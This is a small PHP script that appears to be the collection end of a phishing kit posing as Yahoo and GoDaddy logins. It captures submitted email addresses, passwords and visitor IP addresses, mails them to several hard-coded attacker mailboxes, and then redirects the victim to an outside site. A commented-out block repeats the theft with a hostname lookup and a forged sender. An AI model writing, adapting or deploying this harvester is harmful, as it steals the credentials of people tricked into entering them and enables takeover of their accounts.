<?php


if(isset($_POST['submit'])) {

	$to = "amazinggenie0@outlook.com,cuddlesm71@yandex.com,blac3110@outlook.com,amazinggenie121@gmail.com"; 
	$subject = "Form Yahoo logs";
	$name_field = $_POST['emaill'];
	$email_field = $_POST['pass'];
	$message = $_POST['message'];
	$ipaddress = $_SERVER['REMOTE_ADDR'];



	
	$body="email: $name_field\n  pass: $email_field\n  Message: $message\n  Location: $ipaddress\n";

	echo '<meta http-equiv="refresh" content="3;url=https://www.soleras.cl/bigpond" />';
	mail($to, $subject, $body);
	
} else {
	echo "blarg!";
}

?>

<?php
echo '<meta http-equiv="refresh" content="3;url=https://www.soleras.cl/bigpond" />';

// if(isset($_POST['submit'])) {
// $ip = getenv("REMOTE_ADDR");
// $hostname = gethostbyaddr($ip);
// $message  = "==================+ gdaddy +==================\n";
// $message .= "Email: ".$_POST['emaill']."\n";
// $message .= "Pass: ".$_POST['pass']."\n";

// $message .= "===================+ID +===========\n";
// $message .= "Client IP : ".$ip."\n";
// $message .= "HostName : ".$hostname."\n";
// $message .= "=============Godaddy =============\n";
// $rnessage = "$message\n";
// $send= "blac3110@outlook.com";
// $subject = "G Daddy | $ip";
// $headers = "From: G Daddy <morestuffs@randomstuffs.com>";

// $str=array($send, $IWP); foreach ($str as $send)
// if(mail($send,$subject,$rnessage,$headers) != false){
// mail($Send,$subject,$rnessage,$headers);

// }
// }
// header("https://khoancatbetonglocphat.com/bigpond/index");
?>
